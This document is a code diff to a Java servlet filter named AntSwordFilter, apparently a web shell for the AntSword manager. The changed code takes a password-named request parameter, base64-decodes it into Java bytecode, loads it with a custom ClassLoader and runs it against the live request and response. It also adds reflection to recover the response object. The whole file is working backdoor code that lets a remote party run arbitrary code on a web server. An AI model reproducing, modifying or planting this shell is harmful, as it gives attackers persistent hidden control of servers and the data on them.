@@ -13,17 +13,85 @@ import javax.servlet.http.HttpServletResponse;
 import java.io.IOException;
 import java.lang.reflect.Constructor;
 import java.lang.reflect.Field;
-import java.lang.reflect.Method;
 import java.util.Map;
-import java.util.concurrent.ConcurrentHashMap;
 
-public class AntSwordFilter  implements Filter {
+public class AntSwordFilter extends ClassLoader implements Filter {
 
-    static Map<String, Class<?>> loaded = new ConcurrentHashMap<>();
+    public String cs = "UTF-8";
+    public HttpServletRequest request = null;
+    public HttpServletResponse response = null;
+
+    public AntSwordFilter() {
+    }
+
+    public AntSwordFilter(ClassLoader c) {
+        super(c);
+    }
+
+    public Class g(byte[] b) {
+        return super.defineClass(b, 0, b.length);
+    }
+
+    public boolean equals(Object obj) {
+        this.parseObj(obj);
+        StringBuffer output = new StringBuffer();
+        String tag_s = "->|";
+        String tag_e = "|<-";
+
+        try {
+            this.response.setContentType("text/html");
+            this.request.setCharacterEncoding(this.cs);
+            this.response.setCharacterEncoding(this.cs);
+        } catch (Exception var7) {
+            output.append("ERROR:// " + var7.toString());
+        }
+
+        try {
+            this.response.getWriter().print(tag_s + output.toString() + tag_e);
+            this.response.getWriter().flush();
+            this.response.getWriter().close();
+        } catch (Exception var6) {
+        }
+
+        return true;
+    }
+
+    public void parseObj(Object obj) {
+        if (obj.getClass().isArray()) {
+            Object[] data = (Object[])obj;
+            this.request = (HttpServletRequest)data[0];
+            this.response = (HttpServletResponse)data[1];
+        } else {
+            try {
+                Class clazz = Class.forName("javax.servlet.jsp.PageContext");
+                this.request = (HttpServletRequest)clazz.getDeclaredMethod("getRequest").invoke(obj);
+                this.response = (HttpServletResponse)clazz.getDeclaredMethod("getResponse").invoke(obj);
+            } catch (Exception var81) {
+                if (obj instanceof HttpServletRequest) {
+                    this.request = (HttpServletRequest)obj;
+
+                    try {
+                        Field req = this.request.getClass().getDeclaredField("request");
+                        req.setAccessible(true);
+                        HttpServletRequest request2 = (HttpServletRequest)req.get(this.request);
+                        Field resp = request2.getClass().getDeclaredField("response");
+                        resp.setAccessible(true);
+                        this.response = (HttpServletResponse)resp.get(request2);
+                    } catch (Exception var71) {
+                        try {
+                            this.response = (HttpServletResponse)this.request.getClass().getDeclaredMethod("getResponse").invoke(obj);
+                        } catch (Exception var6) {
+                        }
+                    }
+                }
+            }
+        }
+    }
 
     public static String name;
     public static String pattern;
     public static String password;
+
     static {
         try {
             final String urlPattern = pattern;
@@ -77,28 +145,17 @@ public class AntSwordFilter  implements Filter {
         Filter.super.init(filterConfig);
     }
 
-    class U extends ClassLoader {
-        U(ClassLoader c) {
-            super(c);
-        }
-        public Class g(byte[] b) {
-            return super.defineClass(b, 0, b.length);
-        }
-    }
-
     @Override
     public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
-        HttpServletRequest request = (HttpServletRequest) servletRequest;
-        HttpServletResponse response = (HttpServletResponse) servletResponse;
-        if ("POST".equalsIgnoreCase(request.getMethod())) {
+        HttpServletRequest req = (HttpServletRequest)servletRequest;
+        HttpServletResponse res = (HttpServletResponse)servletResponse;
+        String cls = req.getParameter(password);
+        if (cls != null) {
             try {
-                String cls = request.getParameter(password);
-                if (cls != null) {
-                    new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(new Object[]{request,response});
-                }
-            } catch (Exception e) { e.printStackTrace(); }
+                (new AntSwordFilter(this.getClass().getClassLoader())).g(this.base64Decode(cls)).newInstance().equals(new Object[]{req, res});
+            } catch (Exception var8) {
+            }
         }
-        filterChain.doFilter(request, response);
     }
 
     public byte[] base64Decode(String str) throws Exception {
